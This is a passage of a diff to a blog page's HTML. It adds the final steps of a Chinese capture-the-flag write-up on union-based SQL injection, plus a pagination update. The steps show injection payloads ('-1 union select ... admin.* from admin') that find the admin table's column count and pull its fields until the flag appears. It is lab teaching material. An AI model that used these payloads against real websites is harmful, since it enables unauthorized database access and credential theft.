+<p>9、25也为回显点，使用 admin.* from admin 猜测 admin表的字段数<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,9711,9712,9713,9714,9715,9716,9717,9718,9719,9720,9721,9722,9723,9724,9725,admin.*from admin<br><img src="https://img-blog.csdnimg.cn/20210410171251653.png" alt="在这里插入图片描述"></p>
+<p>10、依次减去字段数，直到9710，得到数据 width &#x3D; 450，得到admin表倒数第二个字段<br>-1 union select 971,972,973,974,975,976,977,978,979,9710,admin.* from admin<br><img src="https://img-blog.csdnimg.cn/20210410171302980.png" alt="在这里插入图片描述"></p>
+<p>11、把admin.* 前移一个位置<br>-1 union select 971,972,973,974,975,976,977,978,979,admin.*,9710 from admin<br><img src="https://img-blog.csdnimg.cn/20210410171311977.png" alt="在这里插入图片描述"><br>12、得到FLAG，通关</p>
 
       
     </div>
@@ -1435,7 +1597,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/4/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
